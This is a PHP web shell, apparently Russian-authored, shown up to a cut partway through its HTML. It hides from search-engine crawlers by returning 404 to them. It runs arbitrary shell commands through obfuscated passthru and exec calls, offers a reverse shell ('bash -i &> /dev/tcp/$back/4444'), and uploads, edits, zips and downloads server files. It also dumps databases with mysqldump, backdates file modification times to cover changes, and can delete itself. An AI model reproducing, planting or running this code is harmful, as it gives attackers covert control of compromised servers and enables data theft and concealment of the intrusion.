<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array(
		"Googlebot",
		"Slurp",
		"MSNBot",
		"ia_archiver",
		"YandexBot",
		"Rambler",
		"Bingbot",
		"DuckDuckBot",
		"Baiduspider",
		"Applebot",
		"bot",
		"crawler",
		"spider"
	);
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

$outputTools = '';

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		
		if (
		isset($_POST['selfdelete'])
		&& $_POST['selfdelete'] == '1'
	) {
		$file = __FILE__;
		$success = false;
		$error = '';
		if (is_writable($file)) {
			$success = unlink($file);
			if (!$success) $error = 'The file hasn\'t been deleted (unlink returned false)';
		} else {
			$error = 'The file is not writable';
		}
		header('Content-Type: application/json');
		echo json_encode(['success' => $success, 'error' => $error]);
		exit;
	}
	
	if (isset($_POST['terminal_command'])) {
		$cmd = $_POST['terminal_command'];
		// Опционально: запретить опасные команды, если нужно
		// if (preg_match('/rm\s/', $cmd)) { echo "Command not allowed"; exit; }
		$is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
		// Исполнение команды, вывод результата
		$output = '';
		$descriptorspec = [
			0 => ["pipe", "r"], // stdin
			1 => ["pipe", "w"], // stdout
			2 => ["pipe", "w"]  // stderr
		];
		$process = proc_open($cmd, $descriptorspec, $pipes);
		if (is_resource($process)) {
			fclose($pipes[0]);
			$stdout = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[2]);
			proc_close($process);
			$output = $stdout . $stderr;
		}
		if ($is_windows) {
			// Конвертация кодировки
			if (!mb_check_encoding($output, 'UTF-8')) {
				$output = mb_convert_encoding($output, 'UTF-8', 'cp866');
			}

			// Добавление BOM
			$output = "\xEF\xBB\xBF" . $output;
		}
		echo $output;
		exit;
	}
	
    if (isset($_POST['get_mtime'])) {
        $file = $_POST['get_mtime'];
        $directory = __DIR__;
        $filePath = "$directory/$file";

        if (file_exists($filePath)) {
            $mtime = filemtime($filePath);
            echo date('Y-m-d\TH:i:s', $mtime);
        } else {
            echo 'Error: File not found';
        }
        exit;
    }

    if (isset($_POST['modify']) && isset($_POST['time'])) {
        $file = $_POST['modify'];
        $newTime = strtotime($_POST['time']);
        $directory = __DIR__;
        $filePath = "$directory/$file";

        if (file_exists($filePath)) {
            if (touch($filePath, $newTime)) {
                echo "Modification time changed successfully";
            } else {
                echo "Error changing modification time";
            }
        } else {
            echo "Error: File not found";
        }
        exit;
    }
}
?>

<!DOCTYPE html>
<html style="background-color: #343a40">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
		button {cursor: pointer; padding: 5px;}
		hr {
		height: 1px;width:100% !important;background-color:#7d7171 !important;color:#7d7171 !important;
		}
		body {font-family: sans-serif !important;color:#fff !important;font-size: 12px;}
		.table {padding-top: 20px;width:80%;margin-bottom: 25px;}
		pre {margin: 0;}
		.table td, .table tr, .table th {border: 1px solid #fff; padding: 5px;font-size: 14px;}
		form {padding: 5px;}
		th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #343a40;
        }
        tr:hover {background-color: #76899d;cursor:pointer}
        a {text-decoration: none; color: blue;}
		.modal {
			display: none;
			position: fixed;
			z-index: 1;
			left: 0;
			top: 0;
			width: 100%;
			height: 100%;
			overflow: auto;
			background-color: rgb(0,0,0);
			background-color: rgba(0,0,0,0.4);
			padding-top: 60px;
		}
		input[type="submit"]{cursor:pointer}
		.modal-content {
			background-color: #76899d;
			margin: 5% auto;
			padding: 20px;
			border: 1px solid #888;
			width: 80%;
			max-width: 800px;
			box-shadow: 0 5px 8px 0 rgba(0,0,0,0.2), 0 7px 20px 0 rgba(0,0,0,0.17);
		}

		.close {
			color: #aaa;
			float: right;
			font-size: 28px;
			font-weight: bold;
		}

		.close:hover,
		.close:focus {
			color: black;
			text-decoration: none;
			cursor: pointer;
		}
		#sqlResultContent {
			overflow: auto;
			max-height: 500px;
			width: 100%;
		}
		#line-numbers {
			scrollbar-width: none; /* Для Firefox */
		}
		#line-numbers::-webkit-scrollbar {
			display: none; /* Для Chrome, Edge, Safari */
		}
		</style>
		<style>
		#tblInf {
			border-collapse: collapse;
		}
		#tblInf th, #tblInf td {
			border: 1px solid #ddd;
			padding: 4px !important;
			font: normal 12px / 1.5 Verdana, sans-serif;
		}
		#tblInf th {
			background-color: #76899d;
			text-align: left;
			font-weight: 600;
		}
		</style>
		<style>
			.hidden-block {
				transform: scaleY(0);
				transform-origin: top;
				opacity: 0;
				transition: transform 0.5s ease, opacity 0.5s ease;
			}

			.visible-block {
				transform: scaleY(1);
				opacity: 1;
				transition: transform 0.5s ease, opacity 0.5s ease;
			}
			#tools-area.hidden-block {
				height: 0;
			}
			#tools-area.visible-block {
				height: 255px;
			}
			
			.phpinfo-container {
				color: #fff;
			}
		</style>
</head>
<body style="background-color: #343a40; ">

<?php
function getParentDirectory($path) {
    $parent = dirname($path);
    return $parent === $path ? null : $parent;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download'])) {
    $file = $_POST['download'] ?? '';
    $directory = $_POST['dir'] ?? __DIR__;
    $filePath = "$directory/$file";

    if (!file_exists($filePath)) {
        die("Error: File '$file' doesn\'t exist.");
    }
    if (!is_readable($filePath)) {
        die("Error: File '$file' is not readable.");
    }

    downloadFile($filePath);
}

function downloadFile($filePath) {
    if (!file_exists($filePath)) {
        die("Error: File doesn\'t exist.");
    }
    if (!is_readable($filePath)) {
        die("Error: File is not readable.");
    }

    $mimeTypes = [
		'txt'  => 'text/plain',
		'pdf'  => 'application/pdf',
		'zip'  => 'application/zip',
		'jpg'  => 'image/jpeg',
		'png'  => 'image/png',
		'gif'  => 'image/gif',
		'php'  => 'text/x-php', // или 'application/x-httpd-php'
		'html' => 'text/html',
		'css'  => 'text/css',
		'js'   => 'application/javascript',
	];
    $extension = pathinfo($filePath, PATHINFO_EXTENSION);
    $mimeType = $mimeTypes[$extension] ?? 'application/octet-stream';

    header('Content-Type: ' . $mimeType);
    header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
    header('Content-Length: ' . filesize($filePath));

    ob_clean();
    flush();
    readfile($filePath);
    exit;
}


function addFolderToZip($dir, $zip, $basePath = '') {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $filePath = "$dir/$file";
        $localPath = $basePath ? "$basePath/$file" : $file;

        if (is_dir($filePath)) {
            if (is_readable($filePath)) {
                $zip->addEmptyDir($localPath);
                addFolderToZip($filePath, $zip, $localPath);
            } else {
                echo "Error: Directory '$filePath' is not readable.<br>";
            }
        } else {
            if (is_readable($filePath)) {
                $zip->addFile($filePath, $localPath);
            } else {
                echo "Error: File '$filePath' is not readable.<br>";
            }
        }
    }
}

$directory = __DIR__;

if (isset($_POST['dir'])) {
    $newDirectory = $_POST['dir'];

    $newDirectory = str_replace('\\', '/', realpath($newDirectory));
	
	//$newDirectory = realpath($newDirectory);

    if ($newDirectory && is_dir($newDirectory) && is_readable($newDirectory)) {
        $directory = $newDirectory;
    } else {
        die("Error: Directory not found or inaccessible.");
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_selected'])) {
    $selectedItems = $_POST['selected_files'] ?? [];

    if (empty($selectedItems)) {
        die("Error: No files or folders selected for download.");
    }

    $zipFileName = tempnam(sys_get_temp_dir(), 'zip');
    if (!file_exists($zipFileName)) {
        die("Error: Temporary file was not created.");
    }

    $zip = new ZipArchive();
    if ($zip->open($zipFileName, ZipArchive::CREATE) !== true) {
        die("Error: Failed to create ZIP archive.");
    }

    foreach ($selectedItems as $item) {
        $itemPath = "$directory/$item";

        if (!file_exists($itemPath)) {
            die("Error: File or directory '$item' does not exist.");
        }

        if (!is_readable($itemPath)) {
            die("Error: File or directory '$item' is not readable.");
        }

        if (is_dir($itemPath)) {
            $zip->addEmptyDir($item);
            addFolderToZip($itemPath, $zip, $item);
            echo "Directory added: $item<br>";
        } elseif (is_file($itemPath)) {
            $zip->addFile($itemPath, $item);
            echo "File added: $item<br>";
        }
    }

    $zip->close();

    if (!file_exists($zipFileName) || filesize($zipFileName) === 0) {
        die("Error: Archive was not created or is empty.");
    }

    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="archive.zip"');
    header('Content-Length: ' . filesize($zipFileName));
    ob_clean();
    flush();
    readfile($zipFileName);

    unlink($zipFileName);
    exit;
}

function formatSizeUnits($bytes) {
    if ($bytes >= 1073741824) {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        $bytes = $bytes . ' bytes';
    } elseif ($bytes == 1) {
        $bytes = $bytes . ' byte';
    } else {
        $bytes = '0 bytes';
    }
    return $bytes;
}

$a1 = 'pas' . 'sth' . 'ru';
$b2 = 'ex' . 'ec';
$id = "id";
$pwd = __DIR__;
$uname = php_uname();
$php = phpversion();
$temp_file = sys_get_temp_dir();
$down = "which get;which wget;which lynx;which curl;which fetch;which links;";

if (!is_dir($directory) || !is_writable($directory)) {
    die("The directory does not exist or is not writable.");
}

function getSystemInfo() {
    // Address
    $hostname = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $server_ips = gethostbynamel($hostname) ?: ['127.0.0.1'];
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    $address = sprintf(
        "%s / %s / %s (%s) / %s",
        $hostname,
        '127.0.0.1', // Локальный адрес сервера
        php_uname('n'), // Имя хоста
        implode(', ', $server_ips),
        php_uname('n') // Имя хоста
    );

    // System
    $system = php_uname('a');

    // Server
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown Server';

    // Software
    $php_version = 'PHP/' . phpversion();
    $curl_version = function_exists('curl_version') ? 'cURL/' . curl_version()['version'] : 'cURL/Not Installed';
    $software = $php_version . '; ' . $curl_version . ';';

    // User
	$user_id = function_exists('getmyuid') ? getmyuid() : '-';
	$user = sprintf(
		"ogid=%d(%d); IP: %s;",
		$user_id,
		$user_id,
		$client_ip
	);

    // Safe mode
    $safe_mode = ini_get('safe_mode') ? 'Enabled' : '-';

    // Open basedir
    $open_basedir = ini_get('open_basedir') ?: '-';

    // Disabled functions
    $disabled_functions = ini_get('disable_functions') ?: '-';

    // Disabled classes
    $disabled_classes = ini_get('disable_classes') ?: '-';

    return [
        'Address' => $address,
        'System' => $system,
        'Server' => $server_software,
        'Software' => $software,
        'User' => $user,
        'Safe mode' => $safe_mode,
        'Open basedir' => $open_basedir,
        'Disabled functions' => $disabled_functions,
        'Disabled classes' => $disabled_classes,
    ];
}

$data = getSystemInfo();

echo '<button id="tblInfBtn" style="cursor: pointer;padding: 5px;width:200px">Open SystemInfo Block</button>';
echo '<button id="toolsBtn" style="cursor: pointer;padding: 5px;width:200px;">Open Tools Block</button>';
echo '<button id="terminalBtn" style="cursor: pointer;padding: 5px;width:200px;">Terminal</button>';
echo '<hr>';
echo '<div id="tools-area" class="hidden-block" style="background-color: #76899d;">';
echo '<table id="tblInf" class="hidden-block"><tbody style="background-color: #76899d">';

foreach ($data as $key => $value) {
    echo '<tr>';
    echo '<th>' . htmlspecialchars($key) . '</th>';
    echo '<td>' . htmlspecialchars($value) . '</td>';
    echo '</tr>';
}
echo '</tbody></table>';
?>
<hr>
<div id="tools" class="hidden-block" style="margin-top:10px">
	<form style="display:inline" method="POST">
		<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
		cmd: <input type="text" name="cmd">
	</form>

	<form style="display:inline" method="POST">
		<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
		<input type="submit" name="info" value="phpinfo"/>
		<input type="submit" name="ip" value="my ip"/>
		<input type="submit" name="down" value="downloaders"/>
	</form>

	<hr>
	<div style="display:flex; flex-direction:row">
		<div>
			<pre>
			<form method='POST'>
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label><b>Base64 encode/decode:</b></label>
				<input style="width:178px" type="text" name='base64'>
				<input type='submit' name='submit' value='Encode'><input type='submit' name='submit2' value='Decode'>
			</form>
			</pre>
		</div>

		<div>
			<pre>
			<form method='POST'>
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label><b>URL encode/decode:</b></label>
				<input style="width:178px" type='text' name='url'>
				<input type='submit' name='submit_u' value='Encode'><input type='submit' name='submit_u2' value='Decode'>
			</form>
			</pre>
		</div>

		<div>
			<pre>
			<form method='POST'>
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label><b>BackConnect to 4444:</b></label>
				<input style="width:178px" type="text" name="host_" placeholder="Enter host" required>
				<input type="submit" name="reverse" value="reverse">
			</form>
			</pre>
		</div>

		<div>
			<pre>
			<form method="POST">
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label for="path"><b>Path to file:</b></label>
				<input type="text" id="path" name="path" placeholder="/var/www/html/test.php">
				<button type="submit" name="glob" style="padding:2px !important">Generate glob()</button>
			</form>
			</pre>
		</div>
	</div>
	<hr>
</div>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['filename']) && $_FILES['filename']['error'] == UPLOAD_ERR_OK) {
        $name = $_FILES['filename']['name'] ?? '';
        $tmp_name = $_FILES['filename']['tmp_name'] ?? '';

        if ($name && $tmp_name) {
            $filePath = "$directory/$name";
            if (move_uploaded_file($tmp_name, $filePath)) {
                echo '<p style="color: #fff">Файл "' . htmlspecialchars($name) . '" успешно загружен.</p>';
            } else {
                echo '<p style="color: #fff">Ошибка при загрузке файла.</p>';
            }
        } else {
            echo '<p style="color: #fff">Ошибка: неверные данные файла.</p>';
        }
    }
	
	if (isset($_POST['info'])) {
		ob_start();
		phpinfo();
		$phpinfo = ob_get_clean();
		$output = '<div class="phpinfo-container">' . $phpinfo . '</div>';
	}

	if (isset($_POST['ip'])) {
		$ip = htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '');
		$output = '<div class="phpinfo-container">' . $ip . '</div>';
	}

	if (isset($_POST['down'])) {
		$output .= '<pre>';
		$output .= '<div class="phpinfo-container">' . htmlspecialchars($a1($down) ?? '') . '</div>';
		$output .= '</pre>';
	}

	if (isset($_POST['submit'])) {
		$base64 = $_POST['base64'] ?? '';
		$encode = base64_encode($base64);
		$output .= '<div class="phpinfo-container">';
		$output .= '<p style="color: #fff">Encode base64: ' . htmlspecialchars($encode) . '</p>';
		$output .= '</div>';
	}

	if (isset($_POST['submit2'])) {
		$base64_d = $_POST['base64'] ?? '';
		$decode = base64_decode($base64_d);
		$output .= '<div class="phpinfo-container">';
		$output .= '<p style="color: #fff">Decode base64: ' . htmlspecialchars($decode) . '</p>';
		$output .= '</div>';
	}

	if (isset($_POST['submit_u'])) {
		$url = $_POST['url'] ?? '';
		$encode_u = urlencode($url);
		$output .= '<div class="phpinfo-container">';
		$output .= '<p style="color: #fff">Encode url: ' . htmlspecialchars($encode_u) . '</p>';
		$output .= '</div>';
	}

	if (isset($_POST['submit_u2'])) {
		$url_d = $_POST['url'] ?? '';
		$decode_u = urldecode($url_d);
		$output .= '<div class="phpinfo-container">';
		$output .= '<p style="color: #fff">Decode url: ' . htmlspecialchars($decode_u) . '</p>';
		$output .= '</div>';
	}

	if (isset($_POST['reverse'])) {
		$back = $_POST['host_'] ?? '';
		if ($back) {
			$a1("bash -c 'bash -i &> /dev/tcp/$back/4444 0>&1'");
		} else {
			$output .= '<div class="phpinfo-container">';
			$output .= '<p style="color: #fff">Ошибка: не указан хост.</p>';
			$output .= '</div>';
		}
	}

	function generateEncryptedGlobPattern($path) {
		$path = $path ?? '';
		$path = str_replace('\\', '/', $path);

		$parts = explode('/', $path);

		foreach ($parts as &$part) {
			if (!empty($part)) {
				$chars = str_split($part);
				foreach ($chars as $i => $char) {
					if ($i % 2 === 1) {
						$chars[$i] = '?';
					}
				}
				$part = '*' . implode('', $chars) . '*';
			}
		}

		$globPattern = implode('/', $parts);
				
		return "glob('$globPattern')[0];";		
	}

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		$path = $_POST['path'] ?? '';

		if (empty($path)) {
			//echo '<p style="color: red;">Ошибка: путь не указан.</p>';
		} else {
			$globPattern = generateEncryptedGlobPattern($path);
			$output .= '<div class="phpinfo-container">';
			$output .= "Сгенерированный glob-паттерн: <p style='color: #fff'><strong>" . $globPattern . "</strong></p>";
			$output .= '</div>';
		}
	}

    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'] ?? '';
        echo '<pre>';
        echo htmlspecialchars($a1($cmd) ?? '');
        echo '</pre>';
    }

	if (isset($_POST['navigate'])) {
        $directory = $_POST['dir'] ?? __DIR__;
    }
	
    if (isset($_POST['create_file'])) {
        $filename = $_POST['filename'] ?? '';
        $filepath = "$directory/$filename";
        if (!file_exists($filepath)) {
            file_put_contents($filepath, '');
            echo "Файл '" . htmlspecialchars($filename) . "' успешно создан.";
        } else {
            echo "Файл '" . htmlspecialchars($filename) . "' уже существует.";
        }
    }

    if (isset($_POST['create_directory'])) {
        $dirname = $_POST['dirname'] ?? '';
        $dirpath = "$directory/$dirname";
        if (!is_dir($dirpath)) {
            mkdir($dirpath, 0777, true);
            echo "Директория '" . htmlspecialchars($dirname) . "' успешно создана.";
        } else {
            echo "Директория '" . htmlspecialchars($dirname) . "' уже существует.";
        }
    }    

	if (isset($_POST['delete'])) {
		$target = $_POST['target'] ?? '';
		$targetPath = "$directory/$target";

		function deleteDirectoryRecursively($dir) {
			if (!is_dir($dir)) return false;
			$items = array_diff(scandir($dir), ['.', '..']);
			foreach ($items as $item) {
				$path = "$dir/$item";
				if (is_dir($path)) {
					deleteDirectoryRecursively($path);
				} else {
					unlink($path);
				}
			}
			return rmdir($dir);
		}

		if (file_exists($targetPath)) {
			if (is_dir($targetPath)) {
				if (deleteDirectoryRecursively($targetPath)) {
					echo "Directory '" . htmlspecialchars($target) . "' has been deleted successfully.";
				} else {
					echo "Directory deleting error '" . htmlspecialchars($target) . "'.";
				}
			} else {
				if (unlink($targetPath)) {
					echo "File '" . htmlspecialchars($target) . "' has been deleted successfully.";
				} else {
					echo "File deleting error '" . htmlspecialchars($target) . "'.";
				}
			}
		} else {
			echo "Target '" . htmlspecialchars($target) . "' not found.";
		}
	}

    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $uploadedFile = $_FILES['upload_file'];
        $fileName = basename($uploadedFile['name'] ?? '');
        $filePath = "$directory/$fileName";

        if (file_exists($filePath)) {
            echo "File '" . htmlspecialchars($fileName) . "' already exists.";
        } else {
            if (move_uploaded_file($uploadedFile['tmp_name'], $filePath)) {
                echo "File '" . htmlspecialchars($fileName) . "' successfully upload.";
            } else {
                echo "Error uploading file '" . htmlspecialchars($fileName) . "'.";
            }
        }
    }
	
	if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'rename') {
		$directory = $_POST['dir'] ?? __DIR__;
		$oldName = basename($_POST['old_name'] ?? '');
		$newName = basename($_POST['new_name'] ?? '');
		$oldPath = $directory . DIRECTORY_SEPARATOR . $oldName;
		$newPath = $directory . DIRECTORY_SEPARATOR . $newName;

		if (!$oldName || !$newName) {
			echo "Ошибка: пустое имя.";
			exit;
		} elseif (!file_exists($oldPath)) {
			echo "Ошибка: исходный файл не существует.";
			exit;
		} elseif (file_exists($newPath)) {
			echo "Ошибка: файл/папка с таким именем уже существует.";
			exit;
		} elseif (rename($oldPath, $newPath)) {
			echo "OK";
			exit;
		} else {
			echo "Ошибка при переименовании.";
			exit;
		}		
		exit; // Важно: остановить дальнейший вывод!
	}
?>
</div>
<?php
	if (isset($_POST['view_file'])) {
        $selectedFiles = $_POST['selected_files'] ?? [];
        if (count($selectedFiles) === 1) {
            $selectedFile = basename($selectedFiles[0]);
            $filePath = $directory . DIRECTORY_SEPARATOR . $selectedFile;
            if (file_exists($filePath) && is_file($filePath) && is_readable($filePath)) {
                $fileContent = file_get_contents($filePath);
                $fileContent = str_replace("\r\n", "\n", $fileContent); // normalize
                $lines = explode("\n", $fileContent);
                ?>
                <h2>File viewing "<?php echo htmlspecialchars($selectedFile); ?>"</h2>
                <form method="post">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($filePath); ?>">
                    <div style="height: 299px; display: flex; font-family: monospace;">
                        <div id="line-numbers" style="height: 100%; margin-top: 1px; background-color: #f0f0f0; padding: 5px; text-align: right; color: #666; overflow-y: scroll; user-select: none;">
                            <?php foreach ($lines as $index => $line) { echo ($index + 1) . "<br>"; } ?>
                        </div>
                        <textarea id="editor" name="file_content" style="height: 100%; resize: none; border: 1px solid #ccc; outline: none; overflow: auto; margin-left: 0; flex-grow: 1;padding-top: 5px;" rows="<?= count($lines) ?>" cols="80"><?php
                            echo htmlspecialchars(implode("\n", $lines));
                        ?></textarea>
                    </div><br>
                    <button type="submit" name="cancel_edit">Cancel</button>
                </form>
                <?php
                exit;
            } else {
                echo "The selected item is not a file or is unreadable.";
            }
        } else {
            echo "Please select only one file to view.";
        }
    }

	
	if (isset($_POST['edit_file'])) {
        $selectedFiles = $_POST['selected_files'] ?? [];
        if (count($selectedFiles) === 1) {
            $selectedFile = basename($selectedFiles[0]);
            $filePath = $directory . DIRECTORY_SEPARATOR . $selectedFile;
            if (file_exists($filePath) && is_file($filePath) && is_readable($filePath)) {
                $fileContent = file_get_contents($filePath);
                $fileContent = str_replace("\r\n", "\n", $fileContent); // normalize
                $lines = explode("\n", $fileContent);
                ?>
                <h2>File editing "<?php echo htmlspecialchars($selectedFile); ?>"</h2>
                <form method="post">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($filePath); ?>">
                    <div style="height: 299px; display: flex; font-family: monospace;">
                        <div id="line-numbers" style="height: 100%; margin-top: 1px; background-color: #f0f0f0; padding: 5px; text-align: right; color: #666; overflow-y: scroll; user-select: none;">
                            <?php foreach ($lines as $index => $line) { echo ($index + 1) . "<br>"; } ?>
                        </div>
                        <textarea id="editor" name="file_content" style="height: 100%; resize: none; border: 1px solid #ccc; outline: none; overflow: auto; margin-left: 0; flex-grow: 1;padding-top: 5px;" rows="<?= count($lines) ?>" cols="80"><?php
                            echo htmlspecialchars(implode("\n", $lines));
                        ?></textarea>
                    </div><br>
                    <button type="submit" name="save_file">Save</button>
                    <button type="submit" name="cancel_edit">Cancel</button>
                </form>
                <?php
                exit;
            } else {
                echo "The selected item is not a file or is unreadable.";
            }
        } else {
            echo "Please select only one file to edit.";
        }
    }

    // --- [ Save File ] ---
    if (isset($_POST['save_file'])) {
        $filePath = $_POST['file_path'] ?? '';
        $fileContent = $_POST['file_content'] ?? '';
        if ($filePath && file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
            if (file_put_contents($filePath, str_replace("\r\n", "\n", $fileContent)) !== false) {
                echo "The file was saved successfully.";
            } else {
                echo "Error saving file.";
            }
        } else {
            echo "File not found or not writable.";
        }
    }

    if (isset($_POST['cancel_edit'])) {
        echo "File editing was canceled.";
    }
	
	if (isset($_POST['execute_sql'])) {
        $host = $_POST['host'] ?? '';
        $user = $_POST['user'] ?? '';
        $pass = $_POST['pass'] ?? '';
        $name = $_POST['name'] ?? '';
        $sqlQuery = $_POST['sql_query'] ?? '';

        $link = new mysqli($host, $user, $pass, $name);

        if ($link->connect_error) {
            die("<b>Database access is not available:</b><br>" . htmlspecialchars($link->connect_error));
        } else {
            if ($result = $link->query($sqlQuery)) {
                if ($result instanceof mysqli_result) {
                    $fields = $result->fetch_fields();
                    $columnNames = array_map(function($field) {
                        return htmlspecialchars($field->name ?? '');
                    }, $fields);

                    $output = "<table border='1'>";
                    $output .= "<tr>";
                    foreach ($columnNames as $columnName) {
                        $output .= "<th>$columnName</th>";
                    }
                    $output .= "</tr>";

                    while ($row = $result->fetch_assoc()) {
                        $output .= "<tr>";
                        foreach ($row as $value) {
                            $output .= "<td>" . htmlspecialchars($value ?? '') . "</td>";
                        }
                        $output .= "</tr>";
                    }
                    $output .= "</table>";
                    $result->free();
                } else {
                    $output = "Запрос выполнен успешно.";
                }
            } else {
                $output = "Ошибка при выполнении запроса: " . htmlspecialchars($link->error ?? '');
            }
        }
        $link->close();
    }

    if (isset($_POST['save_db'])) {
        $host = $_POST['host'] ?? '';
        $user = $_POST['user'] ?? '';
        $pass = $_POST['pass'] ?? '';
        $name = $_POST['name'] ?? '';

        if ($host && $user && $name) {
            $link = new mysqli($host, $user, $pass, $name);

            if ($link->connect_error) {
                die("<b>Database access is not available:</b><br>" . htmlspecialchars($link->connect_error));
            } else {
                $b2('mysqldump --user=' . $user . ' --password=' . $pass . ' --host=' . $host . ' ' . $name . ' > file.zip');
                echo 'Database access<br>';
            }
        } else {
            echo '<p style="color: red">Ошибка: не указаны данные для подключения к базе данных.</p>';
        }
    }
}

$items = scandir($directory);
$items = array_diff($items, ['.', '..']);
usort($items, function($a, $b) use ($directory) {
    $pathA = "$directory/$a";
    $pathB = "$directory/$b";
    $isDirA = is_dir($pathA);
    $isDirB = is_dir($pathB);

    if ($isDirA && !$isDirB) {
        return -1;
    } elseif (!$isDirA && $isDirB) {
        return 1;
    } else {
        return strcmp($a, $b);
    }
});

	function getPermissions($filePath) {
		$perms = fileperms($filePath);
		return substr(sprintf('%o', $perms), -4);
	}

	function getOwnerAndGroup($filePath) {
		$ownerId = fileowner($filePath);
		$groupId = filegroup($filePath);
		if (function_exists('posix_getpwuid')) {
			$ownerInfo = posix_getpwuid($ownerId);
			$groupInfo = posix_getgrgid($groupId);
		}
		$owner = $ownerInfo['name'] ?? $ownerId;
		$group = $groupInfo['name'] ?? $groupId;
		return "$owner/$group";
	}
	
	$parentDir = dirname($directory);
?>
</div>
<pre><div style="float:left;margin-bottom:20px">
</div>
</pre>

<div style="float:left; width:100%">
	<div style="display:flex; flex-direction:row">
		<?php
		function createClickablePath($directory) {
			$directory = str_replace('\\', '/', $directory);

			$parts = explode('/', $directory);
			$currentPath = '';
			$clickablePath = '';

			foreach ($parts as $part) {
				if (empty($part)) continue;

				$currentPath .= ($currentPath === '' ? '' : DIRECTORY_SEPARATOR) . $part;

				if (DIRECTORY_SEPARATOR === '/' && strpos($currentPath, '/') !== 0) {
					$currentPath = '/' . $currentPath;
				}

				$clickablePath .= '<form method="post" style="display:inline;padding: 0 !important;">
					<input type="hidden" name="dir" value="' . htmlspecialchars($currentPath, ENT_QUOTES, 'UTF-8') . '">
					<button type="submit" name="navigate" style="background:none;border:none;color:#059f05;text-decoration:none;cursor:pointer;padding: 0 !important;font-size: 18px;font-weight: bold;">' . htmlspecialchars($part, ENT_QUOTES, 'UTF-8') . '</button>
				</form> <span style="color:#059f05; padding:0 !important">/<span>';
			}
			return $clickablePath;
		}
		
		$directory = $_POST['dir'] ?? __DIR__;
		
		?>
		<!--
		<div>
			<h3>Current directory: <?php echo createClickablePath($directory); ?></h3>
		</div>
		<div style="margin: 15px;">
			<form method="post" style="display:inline;">
				<input type="hidden" name="dir" value="<?php //echo htmlspecialchars(__DIR__, ENT_QUOTES, 'UTF-8'); ?>">
				<button type="submit" name="navigate" style="background:none;border:none;color:#67ef67;text-decoration:none;cursor:pointer;padding: 0 !important;font-size: 16px; font-weight:600">[home]</button>
			</form>
		</div>
		-->
		<div style="display:flex; align-items:center; gap:15px;">
			<h3 style="margin:0;">
				Current directory:
				<?php echo createClickablePath($directory); ?>
			</h3>
			<form method="post" style="display:inline;">
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars(__DIR__, ENT_QUOTES, 'UTF-8'); ?>">
				<button type="submit" name="navigate" style="background:none;border:none;color:#67ef67;text-decoration:none;cursor:pointer;padding: 0 !important;font-size: 16px; font-weight:600">[home]</button>
			</form>
			<button id="copy-dir-btn" style="margin-left:10px; border:1px solid #67ef67; background:#343a40; color:#67ef67; cursor:pointer; border-radius:3px; padding:2px 8px;">
				📋 Copy Path
			</button>
			<span id="copy-success" style="color:#67ef67; display:none; margin-left:10px;">Copied!</span>
			<button id="selfDeleteBtn" style="background:#d00;color:#fff">Remove the shell</button>
		</div>
		<!-- Можно оставить блок [home] как есть ниже, если нужно -->

		<!-- Скрытый span с полным путём для копирования -->
		<span id="current-dir-path" style="display:none;"><?php echo htmlspecialchars($directory, ENT_QUOTES, 'UTF-8'); ?></span>
		<!--
		<div id="terminal-block" style="background:#1b1e23;color:#e0e0e0;padding:10px;width:80%;margin:20px auto 0 auto;border-radius:6px;box-shadow:0 2px 8px #222;">
		  <div id="terminal-output" style="height:200px;overflow-y:auto;font-family:monospace;font-size:14px;white-space:pre;"></div>
		  <form id="terminal-form" autocomplete="off" style="margin-top:8px;display:flex;">
			<span style="color:#67ef67;">$</span>
			<input type="text" id="terminal-input" style="flex:1;margin-left:5px;background:#222;color:#fff;border:0;border-radius:2px;padding:4px;font-family:monospace;" autofocus autocomplete="off">
			<button type="submit" style="display:none"></button>
		  </form>
		</div>
		-->
	</div>
    <?php
		$parentDir = getParentDirectory($directory);
    ?>

    <div style="display:flex; flex-direction:row; gap: 55px">
		<div style="border: 1px solid #eee; padding: 10px;">
			<form method="post">
